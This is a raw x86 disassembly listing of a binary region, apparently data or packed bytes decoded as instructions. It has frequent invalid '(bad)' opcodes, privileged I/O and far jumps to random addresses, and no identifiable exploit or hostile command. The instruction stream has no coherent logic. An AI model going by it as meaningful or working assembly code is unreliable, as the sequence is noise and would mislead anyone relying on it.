  423bec:	in     eax,dx
  423bed:	push   esi
  423bee:	jmp    0x423c28
  423bf0:	xchg   edx,eax
  423bf1:	push   edx
  423bf2:	scas   al,BYTE PTR es:[edi]
  423bf3:	xor    eax,0xeb00d902
  423bf9:	fdivr  DWORD PTR [ebp+0x79]
  423bfc:	add    al,0xba
  423bfe:	rcr    ebp,0x50
  423c01:	(bad)  
  423c02:	xchg   esi,eax
  423c03:	inc    esi
  423c04:	cli    
  423c05:	mov    esp,edi
  423c07:	adc    bl,BYTE PTR [edi-0x741d959c]
  423c0d:	mov    ch,0xcd
  423c0f:	icebp  
  423c10:	sti    
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x66bb99e9]
  423c81:	test   eax,0x7e29f816
  423c86:	add    DWORD PTR [eax],eax
  423c88:	add    eax,0xc6000001
  423c8d:	mov    bh,0x2b
  423c8f:	cli    
  423c90:	sbb    al,0x9f
  423c92:	(bad)  
  423c93:	fdivp  st(4),st
  423c95:	sti    
  423c96:	in     al,dx
  423c97:	and    DWORD PTR [ebx],esi
  423c99:	sub    al,0x7d
  423c9b:	addr16 loopne 0x423ceb
  423c9e:	in     al,dx
  423c9f:	pop    edx
  423ca0:	int    0xd3
  423ca2:	cmp    al,0xaf
  423ca4:	push   edi
  423ca5:	ins    BYTE PTR es:[edi],dx
  423ca6:	jne    0x423c98
  423ca8:	cmp    al,0x72
  423caa:	int    0x72
  423cac:	(bad)  
  423cad:	lock in eax,dx
  423caf:	mov    ecx,0x24cd08f7
  423cb4:	jne    0x423cce
  423cb6:	sub    BYTE PTR [ebp+0x6d19b48e],dh
  423cbc:	fwait
  423cbd:	sub    DWORD PTR [ebx+0x1ef8fdd],ebx
  423cc3:	shl    DWORD PTR [ebp+0x2e],1
  423cc6:	scas   eax,DWORD PTR es:[edi]
  423cc7:	idiv   DWORD PTR [edx+0x4e3feea0]
  423ccd:	pop    ebp
  423cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cd0:	shr    DWORD PTR [ebp+0x6da03242],0x2b
  423cd7:	sbb    eax,0xf2336583
  423cdc:	add    BYTE PTR [esi+0x21],cl
  423cdf:	popa   
  423ce0:	aas    
  423ce1:	mov    edx,0x56481517
  423ce6:	inc    esi
  423ce7:	push   ecx
  423ce8:	adc    dl,BYTE PTR [ecx+0x6b]
  423ceb:	or     eax,0xc554eb5e
  423cf0:	mov    BYTE PTR [esi-0x5678c0ae],ch
  423cf6:	or     eax,0x5544e9b3
  423cfc:	add    BYTE PTR [eax],bl
  423cfe:	std    
  423cff:	pop    esp
  423d00:	cli    
  423d01:	push   0xffffffbb
  423d03:	outs   dx,BYTE PTR ds:[esi]
  423d04:	rep outs dx,BYTE PTR ds:[esi]
  423d06:	mov    edi,0x7549dba
  423d0b:	jp     0x423d10
  423d0d:	addr16 jbe 0x423d83
  423d10:	inc    ecx
  423d11:	ficom  DWORD PTR [ebx-0x7d]
  423d14:	int    0x9d
  423d16:	scas   al,BYTE PTR es:[edi]
  423d17:	loopne 0x423d50
  423d19:	lahf   
  423d1a:	out    0xd1,eax
  423d1c:	mov    BYTE PTR [edx],bl
  423d1e:	mov    eax,ds:0xfeae58bd
  423d23:	pop    ds
  423d24:	xor    al,0xfb
  423d26:	cs mov dl,0xc6
  423d29:	(bad)  
  423d2a:	fmul   DWORD PTR [edi+edx*4+0x44]
  423d2e:	mov    al,0x28
  423d30:	mov    esi,ecx
  423d32:	les    ebx,FWORD PTR [ebp-0x203c31ec]
  423d38:	stos   BYTE PTR es:[edi],al
  423d39:	inc    BYTE PTR [ebp+0x40]
  423d3c:	xchg   edi,eax
  423d3d:	int3   
  423d3e:	dec    eax
  423d3f:	cmp    DWORD PTR [esi],ecx
  423d41:	xor    ebp,ebp
  423d43:	fwait
  423d44:	push   cs
  423d45:	ins    BYTE PTR es:[edi],dx
  423d46:	data16 out dx,al
  423d48:	ins    DWORD PTR es:[edi],dx
  423d49:	outs   dx,DWORD PTR ds:[esi]
  423d4a:	xor    BYTE PTR [esp+edx*8],cl
  423d4d:	je     0x423dad
  423d4f:	dec    edx
  423d50:	int    0x63
  423d52:	icebp  
  423d53:	icebp  
  423d54:	or     eax,0xc520b64
  423d59:	adc    BYTE PTR [edi+esi*2+0x79992400],cl
  423d60:	call   0xf6cb8475
  423d65:	out    dx,al
  423d66:	cld    
  423d67:	scas   eax,DWORD PTR es:[edi]
  423d68:	or     al,0x5a
  423d6a:	mov    eax,fs
  423d6c:	jns    0x423d00
  423d6e:	cs dec edx
  423d70:	fidivr DWORD PTR [eax]
  423d72:	test   BYTE PTR [bx+0x48],ch
  423d76:	test   DWORD PTR [eax+0x487f5a84],edi
  423d7c:	sub    ah,BYTE PTR [ecx+ebx*2-0x6cf8cfc]
  423d83:	mov    bh,0x5
  423d85:	add    BYTE PTR [edi],0x38
  423d88:	mov    ecx,0xf1df0ce
  423d8d:	icebp  
  423d8e:	jb     0x423de4
  423d90:	repnz add BYTE PTR [eax],al
	...
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x49ef9c2e],esp
  423e03:	dec    esi
  423e04:	cs jg  0x423e08
  423e07:	add    BYTE PTR ds:0xe5000001,al
  423e0d:	aam    0x64
  423e0f:	je     0x423e07
  423e11:	es add eax,0xead474e7
  423e17:	outs   dx,DWORD PTR ds:[esi]
  423e18:	icebp  
  423e19:	mov    edx,0x32759266
  423e1e:	outs   dx,BYTE PTR ds:[esi]
  423e1f:	adc    DWORD PTR [edx+0x4dc31103],esi
  423e25:	daa    
  423e26:	in     eax,0x84
  423e28:	(bad)  
  423e29:	stos   BYTE PTR es:[edi],al
  423e2a:	cmp    dl,BYTE PTR [edi-0x41]
  423e2d:	mov    WORD PTR [esi-0x5a393ef3],cs
  423e33:	mov    ah,0xa3
  423e35:	add    ebp,DWORD PTR [edx]
  423e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e39:	sbb    DWORD PTR [edi+0x12433819],esp
  423e3f:	lock je 0x423e88
  423e42:	ret    
  423e43:	in     al,0xd8
  423e45:	and    al,0x21
  423e47:	hlt    
  423e48:	lods   al,BYTE PTR ds:[esi]
  423e49:	jp     0x423e0f
  423e4b:	in     eax,dx
  423e4c:	adc    DWORD PTR [edx+ebx*2],edx
  423e4f:	pop    edi
  423e50:	repnz push eax
  423e52:	inc    ecx
  423e53:	jp     0x423ea7
  423e55:	jbe    0x423ebe
  423e57:	cwde   
  423e58:	lods   al,BYTE PTR ds:[esi]
  423e59:	pop    eax
  423e5a:	pop    ss
  423e5b:	pushfw 
  423e5d:	add    DWORD PTR [ebp-0x69],0x3b
  423e61:	loop   0x423e83
  423e63:	pop    ss
  423e64:	push   ds
  423e65:	jns    0x423de9
  423e67:	push   cs
  423e68:	repz pop esi
  423e6a:	loop   0x423e1d
  423e6c:	inc    DWORD PTR [ebp+0x0]
  423e6f:	pop    esp
  423e70:	push   ds
  423e71:	imul   esp,DWORD PTR [edx-0x5b],0x80f4b752
  423e78:	lea    edx,[ebp+0x17bae9fd]
  423e7e:	in     al,0x4d
  423e80:	mov    edi,0xf0a1040b
  423e86:	dec    esi
  423e87:	mov    ss,WORD PTR [eax]
  423e89:	das    
  423e8a:	(bad)  
  423e8b:	into   
  423e8c:	pop    esi
  423e8d:	cdq    
  423e8e:	jmp    0x67bb:0xbde7377b
  423e95:	jg     0x423eea
  423e97:	bound  ecx,QWORD PTR [ebx+0x3acc8124]
  423e9d:	push   esi
  423e9e:	hlt    
  423e9f:	idiv   BYTE PTR [esi-0x33eecc42]
  423ea5:	push   eax
  423ea6:	fwait
  423ea7:	xchg   esp,eax
  423ea8:	xchg   ebx,eax
  423ea9:	mov    al,ds:0xb7258804
  423eae:	(bad)  
  423eaf:	(bad)  
  423eb0:	mov    esp,0x8b06ba21
  423eb5:	mov    dx,0x361a
  423eb9:	call   0xf45c:0xa70da196
  423ec0:	fidivr DWORD PTR [esp+eiz*8]
  423ec3:	lods   eax,DWORD PTR ds:[esi]
  423ec4:	(bad)  
  423ec5:	jb     0x423ee0
  423ec7:	sti    
  423ec8:	add    al,0xc9
  423eca:	mov    ebx,0x23f18714
  423ecf:	pop    ebx
  423ed0:	mov    edi,0x6fb94016
  423ed5:	cmp    DWORD PTR [edx],0x5d
  423ed8:	das    
  423ed9:	sub    BYTE PTR [edi],dl
  423edb:	pop    edi
  423edc:	fidiv  DWORD PTR [ebp+0x10]
  423edf:	mul    DWORD PTR [eax+0x6b467ebc]
  423ee5:	add    DWORD PTR [edi],edx
  423ee7:	cmp    al,0x2e
  423ee9:	xor    BYTE PTR [ebx-0x17],al
  423eec:	jmp    0xd984ad8a
  423ef1:	and    ecx,DWORD PTR [ebx]
  423ef3:	add    DWORD PTR [edi],ecx
  423ef5:	jmp    0xd213:0xbc5d8b57
  423efc:	jge    0x423ec7
  423efe:	mov    ebx,0x9bdf5157
  423f03:	rcl    BYTE PTR [eax+0x17],1
  423f06:	das    
  423f07:	cwde   
  423f08:	mov    DWORD PTR [edi-0x69],edx
  423f0b:	ret    0x906c
  423f0e:	xor    esi,ecx
  423f10:	dec    edi
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	cdq    
  423f81:	adc    eax,DWORD PTR [edi-0x1c]
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	pop    ecx
  423f8d:	in     eax,0xe4
  423f8f:	test   DWORD PTR [eax+0x3f653fa],ebx
  423f95:	or     DWORD PTR [ebx+0x75],edx
  423f98:	lock sub BYTE PTR ds:0xab59f585,0xd9
  423fa0:	in     eax,0x49
  423fa2:	sub    DWORD PTR [esi],0x15
  423fa5:	jbe    0x423f82
  423fa7:	sbb    DWORD PTR [ebp+0x79],ebp
  423faa:	mov    edx,0x112e236f
  423faf:	push   ebx
  423fb0:	add    al,0x8b
  423fb2:	hlt    
  423fb3:	pop    ds
  423fb4:	clc    
  423fb5:	sti    
  423fb6:	sbb    DWORD PTR [edx],ecx
  423fb8:	sti    
  423fb9:	jae    0x424036
  423fbb:	lods   al,BYTE PTR ds:[esi]
  423fbc:	fidivr DWORD PTR [esi+0x43]
  423fbf:	fs push ecx
  423fc1:	push   ss
  423fc2:	and    al,0xfa
  423fc4:	jl     0x423fd8
  423fc6:	xchg   DWORD PTR [edi+0x42],edi
  423fc9:	into   
  423fca:	add    dh,ch
  423fcc:	int    0xf1
  423fce:	in     eax,0xb6
  423fd0:	jb     0x423fb7
  423fd2:	(bad)  
  423fd3:	xchg   edx,eax
  423fd4:	or     dh,ah
  423fd6:	test   eax,0xb40d7dcd
  423fdb:	out    0x2a,al
  423fdd:	loope  0x423f70
  423fdf:	pushf  
  423fe0:	cwde   
  423fe1:	cwde   
  423fe2:	lods   eax,DWORD PTR ds:[esi]
  423fe3:	fmul   DWORD PTR [edx-0x7d5f2400]
  423fe9:	and    eax,0x135fe539
  423fee:	mov    DWORD PTR [eax],eax
  423ff0:	jae    0x423f7f
  423ff2:	push   ebp
  423ff3:	sub    cx,0x64d2
  423ff8:	icebp  
  423ff9:	rol    DWORD PTR [eax],1
  423ffb:	and    ebp,DWORD PTR [ebx+0x5e]
  423ffe:	push   edx
  423fff:	dec    esi
  424000:	add    esp,esi
  424002:	mov    DWORD PTR [edx+0x2],0xce2882a6
  424009:	mov    cl,0x57
  42400b:	pop    ss
  42400c:	test   eax,0xe3ba3478
  424011:	outs   dx,DWORD PTR ds:[esi]
  424012:	push   0x4b
  424014:	dec    eax
  424015:	adc    BYTE PTR [edx+eax*4+0x725b4fcb],dl
  42401c:	int    0xec
  42401e:	mov    al,ds:0xe3be28f8
  424023:	mov    bl,0x26
  424025:	(bad)  
  424026:	es inc edx
  424028:	ret    
  424029:	out    dx,eax
  42402a:	inc    ecx
  42402b:	xor    DWORD PTR [edx-0x429a3c6c],eax
  424031:	mov    esp,0x5d89b7c7
  424036:	adc    DWORD PTR [ecx],esi
  424038:	adc    al,0x76
  42403a:	rol    BYTE PTR [ecx],0xca
  42403d:	xchg   BYTE PTR [edx-0x50],bl
  424040:	jmp    0x412fe4d5
  424045:	hlt    
  424046:	(bad)  [edi]
  424048:	push   ebp
  424049:	jle    0x42407d
  42404b:	lods   eax,DWORD PTR ds:[esi]
  42404c:	call   0x30215065
  424051:	mov    ebp,0x2947d94f
  424056:	push   ebp
  424057:	mov    edi,0x3058066a
  42405c:	sub    ebp,ebx
  42405e:	das    
  42405f:	loope  0x424005
  424061:	les    esi,FWORD PTR [ecx-0x5ce1e31]
  424067:	mov    es,esp
  424069:	and    BYTE PTR [esi-0x2015dd4f],cl
  42406f:	fistp  WORD PTR [edi]
  424071:	dec    ebx
  424072:	push   cs
  424073:	test   al,0xc5
  424075:	in     eax,0x5
  424077:	push   ecx
  424078:	repz jo 0x4240b4
  42407b:	pusha  
  42407c:	fidivr WORD PTR [ecx]
  42407e:	pause  
  424080:	scas   eax,DWORD PTR es:[edi]
  424081:	int    0x15
  424083:	sub    BYTE PTR [esi-0x5e],cl
  424086:	ins    DWORD PTR es:[edi],dx
  424087:	arpl   WORD PTR [eax],di
  424089:	push   edx
  42408a:	lea    edx,[ebx+0x6c]
  42408d:	and    esp,DWORD PTR [ebp+0x67c5]
	...
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	mov    bl,0xe3
  424102:	ss loopne 0x42413d
  424105:	add    DWORD PTR [ecx],0x10500
  42410b:	add    BYTE PTR [edx-0x148abd8d],cl
  424111:	pop    edi
  424112:	fs pop eax
  424114:	mov    DWORD PTR [edi+0x5e09a4db],eax
  42411a:	add    BYTE PTR [eax-0x45e28d69],0x69
  424121:	cdq    
  424122:	outs   dx,DWORD PTR ds:[esi]
  424123:	mov    gs,WORD PTR [ebx-0x15]
  424126:	hlt    
  424127:	xchg   ebx,eax
  424128:	lock ret 
  42412a:	and    BYTE PTR [ebx],dl
  42412c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42412d:	mov    BYTE PTR [ebp-0x643477ec],0x59
  424134:	sub    BYTE PTR [esi+ebp*8+0x440212dc],al
  42413b:	js     0x4241a0
  42413d:	lods   eax,DWORD PTR ds:[esi]
  42413e:	jle    0x424177
  424140:	test   edx,edi
  424142:	scas   al,BYTE PTR es:[edi]
  424143:	lods   eax,DWORD PTR ds:[esi]
  424144:	sub    eax,0x30fca602
  424149:	push   ds
  42414a:	and    BYTE PTR [esi],dl
  42414c:	dec    ebx
  42414d:	push   edi
  42414e:	cmp    edi,DWORD PTR [ecx-0x5142cc59]
  424154:	(bad)  
  424157:	sub    al,0x6c
  424159:	sub    ah,0xb5
  42415c:	adc    ecx,DWORD PTR [ebp+0x26]
  42415f:	sub    DWORD PTR [ebp+0x4a3b9900],ecx
  424165:	xor    al,0x2a
  424167:	jb     0x42411d
  424169:	adc    ch,BYTE PTR [esi-0x60de34b9]
  42416f:	xchg   ebx,eax
  424170:	lds    edi,FWORD PTR [edx-0x22662638]
  424176:	retf   0x1a40
  424179:	gs dec ebp
  42417b:	stos   DWORD PTR es:[edi],eax
  42417c:	je     0x424121
  42417e:	mov    ebp,0x748b29a6
  424183:	(bad)  
  424184:	je     0x4241b0
  424186:	les    esi,FWORD PTR [eax+0x13250cab]
  42418c:	add    ebx,edx
  42418e:	mov    ebp,0x8263e27c
  424193:	mov    BYTE PTR [esi],bl
  424195:	mov    ds:0xcddb6107,al
  42419a:	and    ah,BYTE PTR [ecx+ecx*4+0x26]
  42419e:	sbb    DWORD PTR [eax+0x17],ecx
  4241a1:	jp     0x424188
  4241a3:	cmp    DWORD PTR [edx+0x1288f675],0xd8d3b5fd
  4241ad:	sub    eax,0x4d7c46a9
  4241b2:	pop    edx
  4241b3:	repnz (bad) 
  4241b5:	out    dx,eax
  4241b6:	push   esp
  4241b7:	adc    DWORD PTR [ebp+0x5b],eax
  4241ba:	loop   0x424189
  4241bc:	cmp    cl,0x62
  4241bf:	inc    ecx
  4241c0:	add    BYTE PTR [edi+0x77],bl
  4241c3:	push   0x6e10976d
  4241c8:	sbb    al,0x15
  4241ca:	push   0xffffffca
  4241cc:	cdq    
  4241cd:	mov    esp,0xbb528dc5
  4241d2:	stc    
  4241d3:	shr    DWORD PTR [eax+edx*4+0x2a],1
  4241d7:	xor    dl,BYTE PTR [ebp+0x4d]
  4241da:	sbb    al,0x32
  4241dc:	jle    0x4241a4
  4241de:	inc    esi
  4241df:	ins    BYTE PTR es:[edi],dx
  4241e0:	outs   dx,BYTE PTR ds:[esi]
  4241e1:	mov    ebx,0xd3c887be
  4241e6:	push   ss
  4241e7:	mov    cl,0x4a
  4241e9:	out    dx,al
  4241ea:	sub    edx,DWORD PTR [edi-0x5b401370]
  4241f0:	ins    BYTE PTR es:[edi],dx
  4241f1:	and    BYTE PTR [edx],dl
  4241f3:	sub    DWORD PTR [ecx],esi
  4241f5:	pop    ecx
  4241f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241f7:	mov    es,WORD PTR [esi+0x4ebc1c85]
  4241fd:	mov    bl,0x5a
  4241ff:	jmp    0x424208
  424201:	int    0x3f
  424203:	mov    dl,BYTE PTR [eax]
  424205:	cwde   
  424206:	fwait
  424207:	ds xor dh,bl
  42420a:	lods   eax,DWORD PTR ds:[esi]
  42420b:	in     al,dx
  42420c:	int    0x58
  42420e:	aaa    
  42420f:	or     al,0xf
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	sub    BYTE PTR [ebx+esi*8-0x66],bl
  424284:	cmp    eax,0x5000182
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    ah,dl
  42428d:	aam    0x28
  42428f:	mov    ch,0x6e
  424291:	xor    BYTE PTR [eax+0x19619d],dh
  424297:	mov    al,ds:0x6596a745
  42429c:	push   ebp
  42429d:	hlt    
  42429e:	mov    bl,cl
  4242a0:	dec    ebp
  4242a1:	sub    DWORD PTR [edx+0x14],0x8faaf4b8
  4242a8:	cmp    edi,DWORD PTR [edi+ebp*1-0x4c]
  4242ac:	nop
  4242ad:	lods   eax,DWORD PTR gs:[esi]
  4242af:	std    
  4242b0:	les    edi,FWORD PTR [eax]
  4242b2:	mov    WORD PTR [ebp+0x34342651],ss
  4242b8:	rcl    DWORD PTR [ebp+eax*1+0x3c711dce],0x8a
  4242c0:	or     DWORD PTR [eax],0x655c2b0
  4242c6:	ins    BYTE PTR es:[edi],dx
  4242c7:	mov    gs,WORD PTR [esi]
  4242c9:	arpl   WORD PTR [ebx+0x56c376eb],bx
  4242cf:	jmp    DWORD PTR [esi]
  4242d1:	lock test eax,0xf0900465
  4242d7:	aad    0xb7
  4242d9:	mov    ch,0x49
  4242db:	inc    edx
  4242dc:	push   ebp
  4242dd:	jno    0x4242d6
  4242df:	cmp    BYTE PTR [eax-0x2d],ch
  4242e2:	dec    eax
  4242e3:	jmp    0xdf4b:0x8f7b7a54
  4242ea:	xchg   BYTE PTR [eax+esi*2+0x2d],ch
  4242ee:	stc    
  4242ef:	sbb    al,0x39
  4242f1:	mov    bh,0xf3
  4242f3:	ds cdq 
  4242f5:	mov    dl,0xfc
  4242f7:	pushf  
  4242f8:	cmc    
  4242f9:	ds in  al,0x58
  4242fc:	sub    dh,ah
  4242fe:	daa    
  4242ff:	mov    ah,0xff
  424301:	das    
  424302:	shr    ch,0xaf
  424305:	ds rcl ebp,1
  424308:	jl     0x42432a
  42430a:	adc    DWORD PTR [ecx],ebp
  42430c:	call   0x74217a14
  424311:	push   0x817ba7bf
  424316:	jmp    0x4d57:0x5169b201
  42431d:	xor    al,BYTE PTR [eax-0x53]
  424320:	fmul   QWORD PTR [eax-0x54]
  424323:	je     0x42438e
  424325:	hlt    
  424326:	(bad)  
  424327:	cdq    
  424328:	out    0x38,al
  42432a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42432b:	stos   BYTE PTR es:[edi],al
  42432c:	cmp    ch,al
  42432e:	push   0x36e995e6
  424333:	adc    DWORD PTR [ebx],0x4a8568e0
  424339:	xchg   esp,eax
  42433a:	lds    ebx,FWORD PTR [ebp+0x7d01a4ba]
  424340:	in     al,dx
  424341:	sub    eax,0xbdd2cc18
  424346:	lea    edi,[esi]
  424348:	popa   
  424349:	pop    eax
  42434a:	pop    esi
  42434b:	leave  
  42434c:	jmp    0x424318
  42434e:	cmc    
  42434f:	jge    0xa8d34387
  424355:	and    eax,0x8a0f3dff
  42435a:	cmc    
  42435b:	fld    QWORD PTR [eax]
  42435d:	push   ecx
  42435e:	les    ebx,FWORD PTR [edx-0x2c7c0b50]
  424364:	mul    cl
  424366:	adc    DWORD PTR [eax],0xb
  424369:	mov    edi,0xb4141643
  42436e:	mov    ds:0x41166ec8,eax
  424373:	inc    esp
  424374:	ds aas 
  424376:	fidivr WORD PTR [ecx+ebp*2-0x4142ac86]
  42437d:	sub    al,0x70
  42437f:	dec    eax
  424380:	hlt    
  424381:	pop    es
  424382:	mov    ebx,0x9cfb48eb
  424387:	xchg   ebx,eax
  424388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42438a:	sbb    esi,DWORD PTR [ecx-0x7f]
  42438d:	adc    dh,BYTE PTR [ebx]
  42438f:	cli    
  424390:	or     eax,DWORD PTR [eax]
	...
  4243f2:	add    BYTE PTR [eax],al
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243b4
  424401:	mov    al,ds:0x83426091
  424406:	add    DWORD PTR [eax],eax
  424408:	add    eax,0x38000001
  42440d:	sbb    edx,DWORD PTR [edi-0x7b39323a]
  424413:	shl    BYTE PTR [ebp+0x6babd7aa],cl
  424419:	outs   dx,BYTE PTR ds:[esi]
  42441a:	(bad)  
  42441b:	js     0x424453
  42441d:	dec    eax
  42441e:	int    0x68
  424420:	add    al,dl
  424422:	div    DWORD PTR [esi+0x4bc5abdc]
  424428:	ds ins BYTE PTR es:[edi],dx
  42442a:	ds out dx,al
  42442c:	or     BYTE PTR [esi+0x20410989],cl
  424432:	sub    cl,BYTE PTR [edx-0x47e93031]
  424438:	push   0x2
  42443a:	push   edi
  42443b:	cmp    dh,BYTE PTR [ebx]
  42443d:	jmp    0x42448b
  42443f:	addr16 add bh,al
  424442:	mov    bh,BYTE PTR [ebx+0x38]
  424445:	fisttp DWORD PTR [esi-0x25]
  424448:	jb     0x42441d
  42444a:	mov    ds:0x1f443ff3,eax
  42444f:	jecxz  0x4243fa
  424451:	sbb    cl,0x20
  424454:	xor    esp,DWORD PTR ds:0x1e29e6a5
  42445a:	pop    ebx
  42445b:	mov    eax,ds:0xee7c57ac
  424460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424461:	mov    eax,ds:0x6d3faf5e
  424466:	push   ss
  424467:	(bad)  
  424469:	mov    ebp,ebx
  42446b:	(bad)  
  42446d:	lock and eax,0xb5cd8b97
  424473:	pop    eax
  424474:	push   esi
  424475:	retf   
  424476:	sbb    dh,BYTE PTR [esi]
  424478:	jnp    0x424439
  42447a:	fild   WORD PTR [eax+0x7e]
  42447d:	aas    
  42447e:	rcl    BYTE PTR [ecx-0x26],0x1c
  424482:	xrelease mov BYTE PTR [eax-0x7378d0a],bh
  424489:	pop    ds
  42448a:	xlat   BYTE PTR ds:[ebx]
  42448b:	push   eax
  42448c:	stos   DWORD PTR es:[edi],eax
  42448d:	int    0xed
  42448f:	inc    edx
  424490:	fwait
  424491:	ins    DWORD PTR es:[edi],dx
  424492:	in     al,dx
  424493:	dec    ebp
  424494:	dec    ecx
  424495:	rdtsc  
  424497:	fmul   QWORD PTR [ebx-0x73ac5891]
  42449d:	mov    cl,ah
  42449f:	inc    esi
  4244a0:	dec    esi
  4244a1:	lock lahf 
  4244a3:	nop
  4244a4:	jecxz  0x424468
  4244a6:	pop    ds
  4244a7:	pop    edx
  4244a8:	lea    esi,[ebx]
  4244aa:	nop
  4244ab:	cmp    esi,ebx
  4244ad:	ret    0x6941
  4244b0:	rol    BYTE PTR [edx+0x73944543],cl
  4244b6:	mov    edx,DWORD PTR [edx]
  4244b8:	pusha  
  4244b9:	sbb    ecx,DWORD PTR [ecx+0x7d2a94b1]
  4244bf:	pop    es
  4244c0:	push   esi
  4244c1:	(bad)  
  4244c2:	jae    0x4244f1
  4244c4:	mov    ebp,0x84744f34
  4244c9:	adc    DWORD PTR [eax+0x2946c3fa],edx
  4244cf:	jb     0x424468
  4244d1:	xlat   BYTE PTR ds:[ebx]
  4244d2:	sub    eax,0x188ed2db
  4244d7:	scas   al,BYTE PTR es:[edi]
  4244d8:	cmp    BYTE PTR [esi-0x73f4194e],0x83
  4244df:	dec    edi
  4244e0:	inc    esp
  4244e1:	lds    edx,FWORD PTR [ecx]
  4244e3:	stos   BYTE PTR es:[edi],al
  4244e4:	mov    ds:0x13b83749,al
  4244e9:	jecxz  0x4244e7
  4244eb:	jbe    0x4244fa
  4244ed:	push   es
  4244ee:	or     edi,0xdba2dc59
  4244f4:	jb     0x4244e1
  4244f6:	(bad)  
  4244f8:	icebp  
  4244f9:	ja     0x424530
  4244fb:	stos   BYTE PTR es:[edi],al
  4244fc:	stos   DWORD PTR es:[edi],eax
  4244fd:	xchg   dh,bl
  4244ff:	cmp    cl,BYTE PTR [ebx+0x73]
  424502:	stc    
  424503:	ret    
  424504:	mov    ecx,0xc64a62b3
  424509:	(bad)  
  42450a:	call   0x270d92ba
  42450f:	jp     0x4244f1
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x30],1
  424581:	icebp  
  424582:	pop    ss
  424583:	push   ebx
  424584:	inc    edi
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0x31000001,al
  42458d:	adc    eax,DWORD PTR [edi]
  42458f:	pop    ebx
  424590:	xchg   edi,eax
  424591:	ret    
  424592:	jne    0x42453c
  424594:	(bad)  
  424595:	scas   eax,DWORD PTR es:[edi]
  424596:	or     eax,0x76c08a68
  42459b:	mov    ds:0x975613ad,al
  4245a0:	fwait
  4245a1:	mov    al,ds:0x97763ee9
  4245a6:	loopne 0x424619
  4245a8:	sub    eax,0x4b7bf3c6
  4245ad:	popf   
  4245ae:	inc    edx
  4245af:	int3   
  4245b0:	shl    DWORD PTR [ecx+0x2b],1
  4245b3:	mov    bl,al
  4245b5:	popf   
  4245b6:	ret    
  4245b7:	rcl    dh,0xc8
  4245ba:	addr16 jge 0x424599
  4245bd:	clc    
  4245be:	push   ds
  4245bf:	into   
  4245c0:	mov    ch,0xbb
  4245c2:	test   eax,0xd9bf5901
  4245c7:	push   DWORD PTR [edi]
  4245c9:	sub    edi,DWORD PTR [edi]
  4245cb:	inc    edi
  4245cc:	int    0xe0
  4245ce:	and    eax,DWORD PTR [edi+ebp*8+0x6cd22590]
  4245d5:	jg     0x4245c7
  4245d7:	jle    0x424622
  4245d9:	jecxz  0x4245bd
  4245db:	xor    DWORD PTR [esi+0x8f490d8],esp
  4245e1:	fimul  DWORD PTR [edx-0x55d7aa74]
  4245e7:	aad    0x40
  4245e9:	mov    DWORD PTR [ebx],esp
  4245eb:	jnp    0x424663
  4245ed:	pop    edi
  4245ee:	cdq    
  4245ef:	repnz inc esi
  4245f1:	mov    cl,0x83
  4245f3:	int3   
  4245f4:	cmc    
  4245f5:	cmp    ebp,edi
  4245f7:	inc    esp
  4245f8:	or     dl,dh
  4245fa:	ror    DWORD PTR [ecx],cl
  4245fc:	and    BYTE PTR [ebx+0x66a7c03a],ah
  424602:	idiv   edx
  424604:	mov    edi,0x9676daa4
  424609:	mov    al,0x3
  42460b:	dec    eax
  42460c:	jle    0x424591
  42460e:	fldenv ds:0x76065c62
  424614:	jmp    0x424604
  424616:	push   edi
  424617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424618:	push   ss
  424619:	mov    ebx,0x61307d30
  42461e:	dec    esi
  42461f:	mov    ch,0x17
  424621:	and    ecx,DWORD PTR [esp+ecx*8]
  424624:	gs pop esp
  424626:	test   DWORD PTR [ecx+0x5dbcedd3],edx
  42462c:	cmc    
  42462d:	adc    eax,0x95a99035
  424632:	pop    eax
  424633:	mov    eax,ds:0xfb12f21d
  424638:	add    DWORD PTR [edi-0x3b9d5843],ebx
  42463e:	in     al,0x28
  424640:	or     cl,BYTE PTR [ebp+edx*8-0x2e]
  424644:	test   ecx,ebp
  424646:	pop    ecx
  424647:	xchg   edx,eax
  424648:	push   esi
  424649:	cwde   
  42464a:	jb     0x4245de
  42464c:	push   0x85b29d1d
